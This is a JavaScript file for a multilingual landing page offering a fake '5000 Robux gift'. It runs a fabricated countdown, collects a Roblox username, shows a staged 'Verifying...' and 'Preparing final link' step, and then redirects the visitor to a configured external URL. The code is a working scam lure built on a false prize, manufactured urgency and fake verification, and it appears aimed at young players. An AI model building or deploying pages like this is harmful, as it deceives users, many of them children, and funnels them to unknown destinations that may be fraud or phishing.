(function () {
  var openButton = document.getElementById("open-claim");
  var closeButton = document.getElementById("close-claim");
  var form = document.getElementById("claim-form");
  var username = document.getElementById("username");
  var status = document.getElementById("claim-status");
  var finalButton = form.querySelector(".final-button");
  var languageSelect = document.getElementById("language-select");
  var countdown = {
    days: document.getElementById("days"),
    hours: document.getElementById("hours"),
    minutes: document.getElementById("minutes"),
    seconds: document.getElementById("seconds")
  };

  var translations = {
    fr: {
      pageTitle: "Roblox 5000 Robux Gift Redeem",
      description: "Recupere ton cadeau Robux avant expiration.",
      ogTitle: "Vous avez recu 5000 Robux",
      languageLabel: "Langue",
      title: "RECUPERER<br>CADEAU",
      giftPrefix: "Vous avez recu",
      claimButton: "RECLAMER",
      modalTitle: "Confirmer le compte",
      modalCopy: "Entre ton pseudo Roblox pour reserver le cadeau.",
      usernameLabel: "Pseudo Roblox",
      usernamePlaceholder: "Ton pseudo",
      finalButton: "Claim reward",
      verifying: "Verification...",
      preparing: "Preparation du lien final pour {username}.",
      dayLabel: "Jour",
      hoursLabel: "Heures",
      minutesLabel: "Minutes",
      secondsLabel: "Secondes"
    },
    en: {
      pageTitle: "Roblox 5000 Robux Gift Redeem",
      description: "Claim your Robux gift before it expires.",
      ogTitle: "You received 5000 Robux",
      languageLabel: "Language",
      title: "REDEEM<br>GIFT",
      giftPrefix: "You received",
      claimButton: "CLAIM",
      modalTitle: "Confirm account",
      modalCopy: "Enter your Roblox username to reserve the gift.",
      usernameLabel: "Roblox username",
      usernamePlaceholder: "Your username",
      finalButton: "Claim reward",
      verifying: "Verifying...",
      preparing: "Preparing final link for {username}.",
      dayLabel: "Day",
      hoursLabel: "Hours",
      minutesLabel: "Minutes",
      secondsLabel: "Seconds"
    },
    es: {
      pageTitle: "Roblox 5000 Robux Gift Redeem",
      description: "Reclama tu regalo de Robux antes de que expire.",
      ogTitle: "Has recibido 5000 Robux",
      languageLabel: "Idioma",
      title: "RECLAMAR<br>REGALO",
      giftPrefix: "Has recibido",
      claimButton: "RECLAMAR",
      modalTitle: "Confirmar cuenta",
      modalCopy: "Introduce tu usuario de Roblox para reservar el regalo.",
      usernameLabel: "Usuario de Roblox",
      usernamePlaceholder: "Tu usuario",
      finalButton: "Claim reward",
      verifying: "Verificando...",
      preparing: "Preparando enlace final para {username}.",
      dayLabel: "Dia",
      hoursLabel: "Horas",
      minutesLabel: "Minutos",
      secondsLabel: "Segundos"
    },
    de: {
      pageTitle: "Roblox 5000 Robux Gift Redeem",
      description: "Hole dein Robux Geschenk, bevor es ablaeuft.",
      ogTitle: "Du hast 5000 Robux erhalten",
      languageLabel: "Sprache",
      title: "GESCHENK<br>EINLOESEN",
      giftPrefix: "Du hast erhalten",
      claimButton: "EINLOESEN",
      modalTitle: "Konto bestaetigen",
      modalCopy: "Gib deinen Roblox Benutzernamen ein, um das Geschenk zu reservieren.",
      usernameLabel: "Roblox Benutzername",
      usernamePlaceholder: "Dein Benutzername",
      finalButton: "Claim reward",
      verifying: "Pruefung...",
      preparing: "Finaler Link fuer {username} wird vorbereitet.",
      dayLabel: "Tag",
      hoursLabel: "Stunden",
      minutesLabel: "Minuten",
      secondsLabel: "Sekunden"
    },
    pt: {
      pageTitle: "Roblox 5000 Robux Gift Redeem",
      description: "Resgate seu presente de Robux antes que expire.",
      ogTitle: "Voce recebeu 5000 Robux",
      languageLabel: "Idioma",
      title: "RESGATAR<br>PRESENTE",
      giftPrefix: "Voce recebeu",
      claimButton: "RESGATAR",
      modalTitle: "Confirmar conta",
      modalCopy: "Digite seu usuario Roblox para reservar o presente.",
      usernameLabel: "Usuario Roblox",
      usernamePlaceholder: "Seu usuario",
      finalButton: "Claim reward",
      verifying: "Verificando...",
      preparing: "Preparando link final para {username}.",
      dayLabel: "Dia",
      hoursLabel: "Horas",
      minutesLabel: "Minutos",
      secondsLabel: "Segundos"
    },
    it: {
      pageTitle: "Roblox 5000 Robux Gift Redeem",
      description: "Riscatta il tuo regalo Robux prima che scada.",
      ogTitle: "Hai ricevuto 5000 Robux",
      languageLabel: "Lingua",
      title: "RISCATTA<br>REGALO",
      giftPrefix: "Hai ricevuto",
      claimButton: "RISCATTA",
      modalTitle: "Conferma account",
      modalCopy: "Inserisci il tuo username Roblox per riservare il regalo.",
      usernameLabel: "Username Roblox",
      usernamePlaceholder: "Il tuo username",
      finalButton: "Claim reward",
      verifying: "Verifica...",
      preparing: "Preparazione link finale per {username}.",
      dayLabel: "Giorno",
      hoursLabel: "Ore",
      minutesLabel: "Minuti",
      secondsLabel: "Secondi"
    }
  };

  var currentLanguage = "fr";

  function getBrowserLanguage() {
    var languages = navigator.languages && navigator.languages.length ? navigator.languages : [navigator.language || "fr"];
    for (var i = 0; i < languages.length; i++) {
      var code = String(languages[i]).toLowerCase().slice(0, 2);
      if (translations[code]) return code;
    }
    return "en";
  }

  function applyLanguage(language) {
    var lang = translations[language] ? language : "en";
    var dict = translations[lang];
    currentLanguage = lang;
    document.documentElement.lang = lang;
    document.title = dict.pageTitle;
    languageSelect.value = lang;

    document.querySelectorAll("[data-i18n]").forEach(function (node) {
      var key = node.getAttribute("data-i18n");
      if (!dict[key]) return;
      node.innerHTML = dict[key];
    });

    document.querySelectorAll("[data-i18n-placeholder]").forEach(function (node) {
      var key = node.getAttribute("data-i18n-placeholder");
      if (dict[key]) node.setAttribute("placeholder", dict[key]);
    });

    document.querySelectorAll("[data-i18n-meta]").forEach(function (node) {
      var key = node.getAttribute("data-i18n-meta");
      if (dict[key]) node.setAttribute("content", dict[key]);
    });

    try {
      localStorage.setItem("redeemGiftLanguage", lang);
    } catch (error) {
      // Ignore private browsing storage errors.
    }
  }

  function translate(key) {
    return (translations[currentLanguage] && translations[currentLanguage][key]) || translations.en[key] || key;
  }

  function openModal() {
    form.hidden = false;
    status.textContent = "";
    finalButton.disabled = false;
    finalButton.textContent = translate("finalButton");
    window.setTimeout(function () {
      username.focus();
    }, 50);
  }

  function closeModal() {
    form.hidden = true;
  }

  function goRedirect() {
    if (window.LandingRedirect && typeof window.LandingRedirect.go === "function") {
      window.LandingRedirect.go("roblox gift redeem");
      return;
    }

    var cfg = window.LANDING_CONFIG || {};
    var url = String(cfg.redirectUrl || "https://example.com").trim();
    if (cfg.openInNewTab) window.open(url, "_blank", "noopener,noreferrer");
    else window.location.href = url;
  }

  openButton.addEventListener("click", openModal);
  closeButton.addEventListener("click", closeModal);

  languageSelect.addEventListener("change", function () {
    applyLanguage(languageSelect.value);
  });

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    var value = username.value.trim().replace(/^@+/, "");
    if (value.length < 3) {
      username.focus();
      return;
    }
    username.value = value;
    finalButton.disabled = true;
    finalButton.textContent = translate("verifying");
    status.textContent = translate("preparing").replace("{username}", value);
    window.setTimeout(goRedirect, 700);
  });

  var remaining = 1 * 86400 + 12 * 3600 + 17 * 60 + 56;
  window.setInterval(function () {
    remaining = Math.max(0, remaining - 1);
    var days = Math.floor(remaining / 86400);
    var hours = Math.floor((remaining % 86400) / 3600);
    var minutes = Math.floor((remaining % 3600) / 60);
    var seconds = remaining % 60;
    countdown.days.textContent = String(days);
    countdown.hours.textContent = String(hours);
    countdown.minutes.textContent = String(minutes);
    countdown.seconds.textContent = String(seconds).padStart(2, "0");
  }, 1000);

  var savedLanguage = null;
  try {
    savedLanguage = localStorage.getItem("redeemGiftLanguage");
  } catch (error) {
    savedLanguage = null;
  }
  applyLanguage(savedLanguage || getBrowserLanguage());
})();
